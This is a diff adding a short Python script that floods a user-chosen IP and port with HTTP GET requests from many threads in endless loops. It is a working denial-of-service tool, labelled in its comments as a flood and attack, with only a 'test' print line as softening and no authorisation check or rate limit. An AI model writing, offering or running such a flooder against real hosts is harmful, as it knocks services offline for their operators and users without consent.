@@ -1,0 +1,34 @@
+import socket
+import threading
+
+# Get input from user
+target_ip = input("Enter target IP address: ")
+target_port = int(input("Enter target port (default 80 for HTTP): "))
+thread_count = int(input("Enter number of threads: "))
+
+# Function to flood the target with requests
+def flood():
+    while True:
+        try:
+            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client.connect((target_ip, target_port))
+            client.send(b"GET / HTTP/1.1\r\n")
+            client.send(b"Host: " + target_ip.encode() + b"\r\n")
+            client.send(b"User-Agent: Mozilla/5.0\r\n")
+            client.send(b"Connection: keep-alive\r\n\r\n")
+            client.close()
+            print("Request sent!")
+        except Exception as e:
+            print(f"Error: {e}")
+
+# Start multiple threads to flood the target
+def start_attack():
+    for _ in range(thread_count):
+        t = threading.Thread(target=flood)
+        t.daemon = True
+        t.start()
+
+if __name__ == "__main__":
+    print(f"Starting test on {target_ip}:{target_port} with {thread_count} threads...")
+    start_attack()
+    input("Press Enter to stop...\n")
